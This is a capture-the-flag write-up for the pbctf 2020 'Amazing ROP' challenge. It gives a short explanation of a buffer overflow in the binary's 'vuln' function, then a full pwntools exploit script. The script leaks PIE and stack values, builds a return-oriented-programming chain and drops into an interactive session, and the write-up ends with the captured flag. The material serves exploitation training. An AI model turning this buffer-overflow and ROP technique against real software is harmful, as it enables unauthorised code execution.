Pwn_Amazing ROP
====

```
Should be a baby ROP challenge. Just need to follow direction and get first flag.

nc maze.chal.perfect.blue 1

By: theKidOfArcrania
```

[bof.c](https://storage.googleapis.com/pbctf-2020-ctfd/8e94e6f057143f9eba46a581a94a69b0/bof.c) [bof.bin](https://storage.googleapis.com/pbctf-2020-ctfd/b315ab20c9c4608a9172d80bd3dcf4e1/bof.bin)

`nc maze.chal.perfect.blue 1`

---

`vuln` funciton is vulnerable by BOF. Therefore we can exploit with ROP attack. I get the flag by using the way of obtaining the flag shown in the source code.

```python
from pwn import *

e = ELF('./bof.bin')
# p = e.process(aslr=False)
p = remote('maze.chal.perfect.blue', 1)

context.log_level = 0

pie_off = 0x4f5c
gadget = 0x000013ad
esi_edi_ebp = 0x00001396

p.sendlineafter(b'n) ','n')

'''
set buf
'''
pay = p64(0)*4
pay += p32(0xFFFFFFFF)*4

'''
set secret
'''
pay += p32(0x67616c66)

'''
get pie
set stack
'''
p.recvuntil(b'ef be ad de ')
x = bytes.fromhex(p.recvuntil('|')[:-1].replace(b' ',b'').decode())
pay += x
pie = int.from_bytes(x,'little') - pie_off
print(hex(pie))
p.recvuntil(b'|')
pay += bytes.fromhex(p.recv(len(' 5c df 61 56 ')).replace(b' ',b'').decode())
ebp = bytes.fromhex(p.recvuntil('|')[:-1].replace(b' ',b'').decode())
pay += ebp
ebp = int.from_bytes(ebp,'little')
p.recvuntil(b'|')
ret = bytes.fromhex(p.recv(len(' 5c df 61 56 ')).replace(b' ',b'').decode())
print(hex(int.from_bytes(ret,'little')))
wtf = bytes.fromhex(p.recvuntil('|')[:-1].replace(b' ',b'').decode())

'''
set ret
'''
pay += p32(pie + esi_edi_ebp)
pay += p32(0x1337)
pay += p32(0x31337)
pay += p32(ebp)
pay += p32(pie + gadget)
pay += p32(1)


p.sendlineafter(b'text: ',pay)
sleep(0.1)
p.recvuntil('address: ')
p.recvline()

p.interactive()
```

`pbctf{hmm_s0mething_l00ks_off_w1th_th1s_s3tup}`
